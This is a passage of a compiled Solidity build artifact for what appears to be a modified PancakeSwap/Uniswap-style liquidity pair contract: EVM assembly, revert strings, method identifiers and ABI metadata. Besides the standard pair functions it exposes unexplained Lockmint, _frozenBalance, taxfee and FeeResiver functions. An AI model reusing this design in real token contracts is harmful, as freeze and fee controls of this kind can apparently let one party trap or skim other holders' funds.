											"begin": 2313,
											"end": 2349,
											"name": "DUP2"
										},
										{
											"begin": 2313,
											"end": 2349,
											"name": "SSTORE"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "MLOAD"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP4"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP2"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "MSTORE"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP6"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "AND"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP2"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "DUP2"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SUB"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "ADD"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "SWAP1"
										},
										{
											"begin": 2364,
											"end": 2397,
											"name": "LOG3"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "POP"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "POP"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "tag",
											"value": "293"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "JUMPDEST"
										},
										{
											"begin": 1807,
											"end": 1811,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1869,
											"end": 1890,
											"name": "DUP4"
										},
										{
											"begin": 1869,
											"end": 1890,
											"name": "AND"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH [tag]",
											"value": "389"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "JUMPI"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP2"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP3"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP3"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "42455032303A206D696E7420746F20746865207A65726F206164647265737300"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP3"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MSTORE"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "MLOAD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "DUP2"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SUB"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "ADD"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "SWAP1"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "REVERT"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "tag",
											"value": "389"
										},
										{
											"begin": 1861,
											"end": 1926,
											"name": "JUMPDEST"
										},
										{
											"begin": 2016,
											"end": 2027,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2016,
											"end": 2027,
											"name": "SLOAD"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "PUSH [tag]",
											"value": "390"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "SWAP1"
										},
										{
											"begin": 2032,
											"end": 2038,
											"name": "DUP4"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2016,
											"end": 2031,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "AND"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "tag",
											"value": "390"
										},
										{
											"begin": 2016,
											"end": 2039,
											"name": "JUMPDEST"
										},
										{
											"begin": 2002,
											"end": 2013,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2002,
											"end": 2039,
											"name": "SWAP1"
										},
										{
											"begin": 2002,
											"end": 2039,
											"name": "DUP2"
										},
										{
											"begin": 2002,
											"end": 2039,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "DUP5"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "AND"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "DUP2"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "MSTORE"
										},
										{
											"begin": 2075,
											"end": 2089,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "MSTORE"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "SWAP1"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "KECCAK256"
										},
										{
											"begin": 2075,
											"end": 2098,
											"name": "SLOAD"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "PUSH [tag]",
											"value": "391"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "SWAP1"
										},
										{
											"begin": 2103,
											"end": 2109,
											"name": "DUP4"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2075,
											"end": 2102,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "AND"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "tag",
											"value": "391"
										},
										{
											"begin": 2075,
											"end": 2110,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP5"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "AND"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "MSTORE"
										},
										{
											"begin": 2049,
											"end": 2063,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP1"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "MSTORE"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP1"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "DUP4"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "KECCAK256"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SWAP5"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SWAP1"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SWAP5"
										},
										{
											"begin": 2049,
											"end": 2110,
											"name": "SSTORE"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP4"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "MLOAD"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP7"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP2"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "MSTORE"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP4"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "MLOAD"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP3"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP4"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP2"
										},
										{
											"begin": 2049,
											"end": 2072,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP3"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "DUP2"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP1"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SUB"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP1"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP2"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "ADD"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "SWAP1"
										},
										{
											"begin": 2125,
											"end": 2162,
											"name": "LOG3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2179,
											"end": 2183,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "SWAP3"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "SWAP2"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "POP"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "POP"
										},
										{
											"begin": 1714,
											"end": 2190,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 321,
											"end": 439,
											"name": "tag",
											"value": "340"
										},
										{
											"begin": 321,
											"end": 439,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 396,
											"end": 406,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 396,
											"end": 413,
											"name": "MUL"
										},
										{
											"begin": 396,
											"end": 413,
											"name": "SWAP1"
										},
										{
											"begin": 321,
											"end": 439,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "tag",
											"value": "341"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "JUMPDEST"
										},
										{
											"begin": 567,
											"end": 576,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 596,
											"end": 606,
											"name": "DUP3"
										},
										{
											"begin": 596,
											"end": 606,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "DUP5"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "AND"
										},
										{
											"begin": 596,
											"end": 606,
											"name": "DUP2"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "PUSH [tag]",
											"value": "394"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "JUMPI"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "INVALID"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "tag",
											"value": "394"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "JUMPDEST"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "DIV"
										},
										{
											"begin": 592,
											"end": 606,
											"name": "SWAP4"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 507,
											"end": 613,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "tag",
											"value": "348"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "ADD"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "LT"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "ISZERO"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "JUMPI"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6164642D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SUB"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "REVERT"
										}
									],
									".data": {
										"50B0A6DD250A09C1CD083AD4BF9F97424665D60E7BC0A208A1151C7D0051999C": "50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54",
										"6591C9F5BF1FEFAAD109B76A20E25C857B696080C952191F86220F001A83663E": "556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
										"6C050B0A8D3F2D18D11271EE0A551B7748437B8FA9A6165C561190D34A2947D6": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544",
										"ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
										"C654718515B5F98052EB92744D97D32CCCABF6E8B2BAE886738591C9B906CFD8": "50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54",
										"EF633320352A650C1D75752F13E6C73D8D8F7F26A5596A6D026C1BF50D2F7713": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544"
									}
								},
								"8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429"
							}
						},
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"FeeResiver()": "900820d8",
							"Lockmint(address)": "dcbbb373",
							"MINIMUM_LIQUIDITY()": "ba9a7a56",
							"PERMIT_TYPEHASH()": "30adf81f",
							"_frozenBalance(address)": "47d5d856",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"burn(address)": "89afcb44",
							"decimals()": "313ce567",
							"factory()": "c45a0155",
							"getReserves()": "0902f1ac",
							"initialize(address,address,uint256)": "1794bb3c",
							"kLast()": "7464fc3d",
							"mint(address)": "6a627842",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"price0CumulativeLast()": "5909c0d5",
							"price1CumulativeLast()": "5a3d5493",
							"skim(address)": "bc25cf77",
							"swap(uint256,uint256,address,bytes)": "022c0d9f",
							"symbol()": "95d89b41",
							"sync()": "fff6cae9",
							"taxfee()": "f317739c",
							"token0()": "0dfe1681",
							"token1()": "d21220a7",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"}],\"name\":\"Sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"FeeResiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Lockmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINIMUM_LIQUIDITY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_frozenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],